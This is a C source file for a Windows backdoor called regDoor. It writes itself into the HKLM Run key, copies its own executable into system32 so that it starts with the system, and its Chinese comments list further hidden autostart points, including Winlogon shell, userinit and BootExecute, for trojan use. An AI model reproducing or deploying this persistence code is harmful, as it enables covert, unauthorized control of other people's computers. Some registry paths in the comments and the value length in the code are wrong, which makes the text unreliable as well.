/*
 * Name: regDoor.exe
 * 代码说明: 注册表写入开机自启动表项中，
 * 并将代码本身 复制到 系统目录下面
 *
 * 注册表加载点:
 * [HEKY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]中 
 *   userinit 键用逗号分割添加程序路径，即可随系统启动而启动
 *
 * [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Winlogon\CurrentVersion\Run] 
 * [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Winlogon\CurrentVersion\Policies\Explorer\Run]  #Run 自己创
 * [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Winlogon\CurrentVersion\Run] 
 *   添加 REG_SZ 类型的键值 即可，名称随便，值为程序路径
 *
 * 更深的加载点:
 * [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\load] 
 * [HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services]
 * [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
 *   shell字符串类型键值中，默认为 Explorer.exe 以木马参数形式调用资源管理器
 * [HKEY_LOCAL_MACHINE\System\ControlSet001\Session Manager]
 *   BootExecute 多字符串键值，默认为: "autocheck autochk *" 用于系统启动自检，在图形界面前运行优先级高
 *
 * 
 */
#include <stdio.h>
#include <windows.h>

int main(){
    char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hkResult;
    int ret;

	char modlepath[256], syspath[256];
	

	//open key
    ret = RegOpenKey(HKEY_LOCAL_MACHINE, regname, &hkResult);

    //write key
    ret = RegSetValueEx(hkResult, "regDoor", 0, REG_EXPAND_SZ, (unsigned char *)"%systemroot%\\system32\\regDoor.exe", 25);

    //close key
    if(ret == 0){
        printf("regedit inject successfully !!!\n");
	}else if(ret == 5){
        printf("regedit write failed: permission deny\nplease run as administrator\n");
		return 1;
    }else{
        printf("regedit write failed, code:%d", ret);
		return 1;
    }

	RegCloseKey(hkResult);
	
    GetModuleFileName(0, modlepath, 256);
    GetSystemDirectory(syspath, 256);

    ret = CopyFile(modlepath, strcat(syspath, "\\regDoor.exe"), 1);

    if(ret)
        printf("%s has been copyed to sys dir %s\n", modlepath, syspath);
    else
        printf("%s is exists", modlepath);

	printf("Module path : %s \nSystem Path : %s\n", modlepath, syspath);

    return 0;


}
